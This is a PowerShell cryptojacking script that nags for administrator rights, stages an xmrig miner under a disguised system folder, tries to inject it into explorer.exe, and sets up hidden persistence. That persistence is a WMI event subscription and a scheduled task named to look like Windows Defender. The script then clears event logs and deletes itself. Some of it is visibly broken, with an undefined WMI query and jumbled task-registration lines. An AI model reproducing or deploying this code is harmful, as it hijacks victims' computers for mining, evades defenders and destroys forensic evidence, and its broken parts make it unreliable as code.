
while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
   
    $process = Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -PassThru
    
    if (-not $process) {
        Write-Host "Administrator permission is required. Retrying in 3 seconds..."
        Start-Sleep -Seconds 3  
    } else {
        Exit 
    }
}

Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force

$confirm = "C:\ProgramData\Microsoft\Settings\Accounts"
$minerHome = "$confirm\xmrig-6.22.2"
$minerBinary = "xmrig.exe"

### === PHASE 5: PROCESS INJECTION ===
try {
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Injector {
        [DllImport("kernel32.dll")] 
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll", CharSet=CharSet.Ansi, ExactSpelling=true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", ExactSpelling=true, SetLastError=true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    }
"@ -ErrorAction Stop

    $targetProc = Get-Process explorer -ErrorAction Stop | Select-Object -First 1
    $hProcess = [Injector]::OpenProcess(0x1F0FFF, $false, $targetProc.Id)
    $loadLib = [Injector]::GetProcAddress([Injector]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
    $alloc = [Injector]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint]"$minerHome\$minerBinary".Length + 1, 0x3000, 0x40)
    [Injector]::WriteProcessMemory($hProcess, $alloc, [Text.Encoding]::ASCII.GetBytes("$minerHome\$minerBinary"), [uint]"$minerHome\$minerBinary".Length + 1, [ref][UIntPtr]::Zero)
    [Injector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLib, $alloc, 0, [IntPtr]::Zero)
}
catch {
    Start-Sleep -Seconds 5
    Start-Process "$minerHome\$minerBinary" -WindowStyle Hidden
}

### === PHASE 6: PERSISTENCE MECHANISMS ===
# Clean existing WMI entries
Get-WmiObject -Namespace root\subscription -Class __EventFilter | 
    Where-Object {$_.Name -like "SysHealth_*"} | 
    Remove-WmiObject -ErrorAction SilentlyContinue

Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | 
    Where-Object {$_.Name -like "SysMaint_*"} | 
    Remove-WmiObject -ErrorAction SilentlyContinue

# WMI Subscription
# 3. WMI Event Subscription (Fixed)
try {
    # Clean up existing WMI artifacts
    Get-WmiObject -Namespace root\subscription -Class __EventFilter | 
        Where-Object { $_.Name -like "SysHealth_*" } | 
        Remove-WmiObject -ErrorAction SilentlyContinue

    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | 
        Where-Object { $_.Name -like "SysMaint_*" } | 
        Remove-WmiObject -ErrorAction SilentlyContinue

    # Create Event Filter
    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
        Name           = "SysHealth_$((Get-Date).Ticks)"
        EventNamespace = 'root\cimv2'
        Query          = $wmiQuery
        QueryLanguage  = 'WQL'
    }

    # Create Consumer
    $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
        Name                 = "SysMaint_$((Get-Date).Ticks)"
        CommandLineTemplate  = "`"$minerHome`" xmrig.exe"
        RunInteractively      = $false  # Critical for background execution
    }

    # Verify objects exist before binding
    if ($filter -and $consumer) {
        $binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
            Filter   = $filter.__PATH
            Consumer = $consumer.__PATH
        }
    }
    else {
        Write-Warning "Failed to create WMI filter/consumer. Binding skipped."
    }
}
catch {
    Write-Warning "WMI Error: $($_.Exception.Message)"
}
# Scheduled Task
try {
    $taskSettings = New-ScheduledTaskSettingsSet `
        -StartWhenAvailable `
        -DontStopIfGoingOnBatteries `
        -MultipleInstances IgnoreNew

    # $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Minutes (Get-Random -Min 2 -Max 5))
    $startupTrigger = New-ScheduledTaskTrigger -AtStartup
    $startupTrigger.Delay = (New-TimeSpan -Minutes (Get-Random -Minimum 2 -Maximum 5))

    $logonTrigger = New-ScheduledTaskTrigger -AtLogOn
    $logonTrigger.Delay = (New-TimeSpan -Minutes (Get-Random -Minimum 2 -Maximum 5))

    -Trigger $trigger `
    $action = New-ScheduledTaskAction -Execute (Join-Path -Path $minerHome -ChildPath "xmrig.exe") `
    -Settings $taskSettings `
    -Force | Out-Null
    Register-ScheduledTask -TaskName "WinDefend_$((Get-Date).Ticks)" -Action $action -Trigger @($startupTrigger, $logonTrigger) `

}
catch {
    Write-Warning "Scheduled task creation failed: $($_.Exception.Message)"
}

# Process watchdog
if (-not (Get-Process -Name (Get-Item $minerHome\$minerBinary).BaseName -ErrorAction SilentlyContinue)) {
    Start-Process "$minerHome\$minerBinary" -WindowStyle Hidden
}

# Log cleanup
wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
wevtutil cl "System" 2>$null

Self-cleanup
if (-not $PSCommandPath.Contains("xmrig-6.22.2")) {
    Start-Process powershell "-Command `"Start-Sleep 5; Remove-Item '$PSCommandPath' -Force`"" -WindowStyle Hidden
}

